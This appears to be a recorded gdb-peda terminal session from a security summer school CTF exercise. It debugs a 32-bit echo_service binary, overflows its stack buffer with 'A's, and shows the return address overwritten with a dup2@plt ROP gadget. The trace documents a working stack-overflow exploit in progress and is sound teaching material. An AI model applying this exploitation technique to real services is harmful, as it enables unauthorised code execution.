+[m0000| [;34m0xbffff2c8[0m --> 0x0 [0m
+[m0004| [;34m0xbffff2cc[0m --> [;31m0xb7e12a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xbffff2d0[0m --> 0x2 [0m
+[m0012| [;34m0xbffff2d4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xbffff2d8[0m --> [;34m0xbffff370[0m --> [;34m0xbffff538[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xbffff2dc[0m --> [;31m0xb7fed7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xbffff2e0[0m --> 0x2 [0m
+[m0028| [;34m0xbffff2e4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 3, 0x0804891d in main ()
+[;31mgdb-peda$ [0mstart 7000c[Kb echo_service [C[C[C[C[C[C[C[C[C[Cset follow-fork-mode child
+[;31mgdb-peda$ [0mc
+Continuing.
+ERROR on binding: Address already in use
+[Inferior 1 (process 13894) exited with code 01]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mq
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ pkill -8 [K[K9 -f echo_segdb -q ./echo_service
+Reading symbols from ./echo_service...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0msgtart[K[K[K[K[Ktart 7000[K1
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x2 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0x31a10af0 
+[;32mEDX[0m: [;34m0xbffff2f4[0m --> [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff2c8[0m --> 0x0 [0m
+[m0004| [;34m0xbffff2cc[0m --> [;31m0xb7e12a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xbffff2d0[0m --> 0x2 [0m
+[m0012| [;34m0xbffff2d4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xbffff2d8[0m --> [;34m0xbffff370[0m --> [;34m0xbffff538[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xbffff2dc[0m --> [;31m0xb7fed7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xbffff2e0[0m --> 0x2 [0m
+[m0028| [;34m0xbffff2e4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 1, 0x0804891d in main ()
+[;31mgdb-peda$ [0mb ec[K[K[K[Kset fork-mo[K[K[K[K[K[K[Kfork
+fork          fork@got.plt  fork@plt      
+[;31mgdb-peda$ [0mset fork[K[K[K[Kfolo[Klow-fork-mode child
+[;31mgdb-peda$ [0mb echo_service
+Breakpoint 2 at 0x8048857
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 16413]
+[Switching to process 16413]
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x4 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mEDX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff238[0m --> [;34m0xbffff258[0m --> [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbfffee10[0m --> 0x34 ('4')
+[;32mEIP[0m: [;31m0x8048857[0m (<echo_service+9>:	mov    DWORD PTR [esp+0x4],0x8048ba0)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804884e <echo_service>:[;2m	push   ebp[0m
+   0x804884f <echo_service+1>:[;2m	mov    ebp,esp[0m
+   0x8048851 <echo_service+3>:[;2m	sub    esp,0x428[0m
+=> 0x8048857 <echo_service+9>:[;1;32m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x804885f <echo_service+17>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x8048862 <echo_service+20>:[m	mov    DWORD PTR [esp],eax[0m
+   0x8048865 <echo_service+23>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x804886a <echo_service+28>:[m	mov    DWORD PTR [esp+0x4],0x8048bd0[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbfffee10[0m --> 0x34 ('4')[0m
+[m0004| [;34m0xbfffee14[0m --> 0x140 [0m
+[m0008| [;34m0xbfffee18[0m --> 0x140 [0m
+[m0012| [;34m0xbfffee1c[0m --> 0x5 [0m
+[m0016| [;34m0xbfffee20[0m --> 0x4 [0m
+[m0020| [;34m0xbfffee24[0m --> 0x3 [0m
+[m0024| [;34m0xbfffee28[0m --> 0x167e94 [0m
+[m0028| [;34m0xbfffee2c[0m --> 0x167e94 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 2, 0x08048857 in echo_service ()
+[;31mgdb-peda$ [0mpdis
+[mDump of assembler code for function echo_service:
+   0x0804884e <+0>:[m	push   ebp[0m
+   0x0804884f <+1>:[m	mov    ebp,esp[0m
+   0x08048851 <+3>:[m	sub    esp,0x428[0m
+=> 0x08048857 <+9>:[m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x0804885f <+17>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048862 <+20>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048865 <+23>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x0804886a <+28>:[m	mov    DWORD PTR [esp+0x4],0x8048bd0[0m
+   0x08048872 <+36>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048875 <+39>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048878 <+42>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x0804887d <+47>:[m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x08048885 <+55>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048888 <+58>:[m	mov    DWORD PTR [esp],eax[0m
+   0x0804888b <+61>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x08048890 <+66>:[m	mov    DWORD PTR [esp+0x4],0x8048bf0[0m
+   0x08048898 <+74>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x0804889b <+77>:[m	mov    DWORD PTR [esp],eax[0m
+   0x0804889e <+80>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488a3 <+85>:[m	mov    DWORD PTR [esp+0x4],0x8048c30[0m
+   0x080488ab <+93>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488ae <+96>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488b1 <+99>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488b6 <+104>:[m	mov    DWORD PTR [esp+0x8],0x1000[0m
+   0x080488be <+112>:[m	lea    eax,[ebp-0x40c][0m
+   0x080488c4 <+118>:[m	mov    DWORD PTR [esp+0x4],eax[0m
+   0x080488c8 <+122>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488cb <+125>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488ce <+128>:[;1;4;31m	call   0x8048600 <read@plt>[0m
+   0x080488d3 <+133>:[m	mov    DWORD PTR [ebp-0xc],eax[0m
+   0x080488d6 <+136>:[m	mov    DWORD PTR [esp+0x4],0x8048c7f[0m
+   0x080488de <+144>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488e1 <+147>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488e4 <+150>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488e9 <+155>:[m	mov    eax,DWORD PTR [ebp-0xc][0m
+   0x080488ec <+158>:[m	mov    DWORD PTR [esp+0x8],eax[0m
+   0x080488f0 <+162>:[m	lea    eax,[ebp-0x40c][0m
+   0x080488f6 <+168>:[m	mov    DWORD PTR [esp+0x4],eax[0m
+   0x080488fa <+172>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488fd <+175>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048900 <+178>:[;32m	call   0x80486b0 <write@plt>[0m
+   0x08048905 <+183>:[m	leave  [0m
+   0x08048906 <+184>:[;34m	ret    [0m
+End of assembler dump.[0m
+[;31mgdb-peda$ [0mb *0x080488d3
+Breakpoint 3 at 0x80488d3
+[;31mgdb-peda$ [0mb*[K *0x08048906
+Breakpoint 4 at 0x8048906
+[;31mgdb-peda$ [0mc
+Continuing.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x43c 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: [;34m0xbfffee2c[0m ('A' <repeats 200 times>...)
+[;32mEDX[0m: 0x1000 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff238[0m ("AAAA\360\205\004\bn\213\004\b\004")
+[;32mESP[0m: [;34m0xbfffee10[0m --> 0x4 
+[;32mEIP[0m: [;31m0x80488d3[0m (<echo_service+133>:	mov    DWORD PTR [ebp-0xc],eax)[0m
+[m[;32mEFLAGS[0m: 0x203 ([;1;31mCARRY[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x80488c8 <echo_service+122>:[;2m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x80488cb <echo_service+125>:[;2m	mov    DWORD PTR [esp],eax[0m
+   0x80488ce <echo_service+128>:[;2;31m	call   0x8048600 <read@plt>[0m
+=> 0x80488d3 <echo_service+133>:[;1;32m	mov    DWORD PTR [ebp-0xc],eax[0m
+   0x80488d6 <echo_service+136>:[m	mov    DWORD PTR [esp+0x4],0x8048c7f[0m
+   0x80488de <echo_service+144>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x80488e1 <echo_service+147>:[m	mov    DWORD PTR [esp],eax[0m
+   0x80488e4 <echo_service+150>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbfffee10[0m --> 0x4 [0m
+[m0004| [;34m0xbfffee14[0m --> [;34m0xbfffee2c[0m ('A' <repeats 200 times>...)[0m
+[m0008| [;34m0xbfffee18[0m --> 0x1000 [0m
+[m0012| [;34m0xbfffee1c[0m --> 0x5 [0m
+[m0016| [;34m0xbfffee20[0m --> 0x4 [0m
+[m0020| [;34m0xbfffee24[0m --> 0x3 [0m
+[m0024| [;34m0xbfffee28[0m --> 0x167e94 [0m
+[m0028| [;34m0xbfffee2c[0m ('A' <repeats 200 times>...)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 3, 0x080488d3 in echo_service ()
+[;31mgdb-peda$ [0mc
+Continuing.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0xffffffff 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xffffffbc 
+[;32mEDX[0m: 0x43c 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41414141 ('AAAA')
+[;32mESP[0m: [;34m0xbffff23c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)
+[;32mEIP[0m: [;31m0x8048906[0m (<echo_service+184>:	ret)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x80488fd <echo_service+175>:[;2m	mov    DWORD PTR [esp],eax[0m
+   0x8048900 <echo_service+178>:[;2;32m	call   0x80486b0 <write@plt>[0m
+   0x8048905 <echo_service+183>:[;2m	leave  [0m
+=> 0x8048906 <echo_service+184>:[;1;32m	ret    [0m
+   0x8048907 <doprocessing>:[m	push   ebp[0m
+   0x8048908 <doprocessing+1>:[m	mov    ebp,esp[0m
+   0x804890a <doprocessing+3>:[m	sub    esp,0x18[0m
+   0x804890d <doprocessing+6>:[m	mov    eax,DWORD PTR [ebp+0x8][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff23c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)[0m
+[m0004| [;34m0xbffff240[0m --> [;31m0x8048b6e[0m (<__libc_csu_init+94>:	pop    edi)[0m
+[m0008| [;34m0xbffff244[0m --> 0x4 [0m
+[m0012| [;34m0xbffff248[0m --> 0x0 [0m
+[m0016| 
